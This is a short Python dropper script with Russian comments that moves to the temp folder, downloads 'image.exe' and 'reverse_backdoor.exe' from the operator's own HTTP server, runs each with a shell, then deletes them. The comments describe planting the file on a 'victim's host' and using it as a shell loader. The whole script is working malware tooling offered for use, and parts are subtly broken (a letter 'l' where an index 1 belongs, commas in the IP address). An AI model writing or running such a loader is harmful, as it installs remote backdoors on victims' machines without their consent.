#!/usr/bin/env python
import tempfile, subprocess, requests, os

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-l]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

# раскомментировать, если нужен ввод на хосте юрла руками, полезно если нужно качать не один файл на хост жертвы + не нужно постоянно редактировать файл.
# download = input("url: ")                       
# print("download: {0}".format(download))
# string = download
# string.file = string.split('/')[-1]
# subprocess.Popen(string.file, shell=True)  # execute file

# раскомментировать, если нужен ввод на хосте юрла руками, полезно если нужно качать не один файл на хост жертвы + не нужно постоянно редактировать файл.
# download2 = input("url: ")
# print("download2: {0}".format(download2))
# string2 = download2
# string2.file = string2.split('/')[-1]
# subprocess.Popen(string2.file, shell=True)  # execute file

# статичный метод, указываешь юрл своего хттп сервера, закидываешь файл жертве и каким либо образом его запускаешь. 
download("http://10,0,2,16/virus/image.exe")  # download file -- commit this and use 1st download if u need. u can use it like shell loader at this line.
subprocess.Popen("image.exe", shell=True)  # execute file

# статичный метод, указываешь юрл своего хттп сервера, закидываешь файл жертве и каким либо образом его запускаешь. (удалить если нужна загрузка только 1 файла). 
download("http://10,0,2,16/virus/reverse_backdoor.exe")  #тут скачиваем файл
subprocess.call("reverse_backdoor.exe", shell=True) #тут запускаем файл

# os.remove("string.file")     # раскомментировать, если пользуешься методом с вводом руками юрла. 
# os.remove("string2.file")    # раскомментировать, если пользуешься методом с вводом руками юрла. 
os.remove("image.exe")
os.remove("reverse_backdoor.exe")

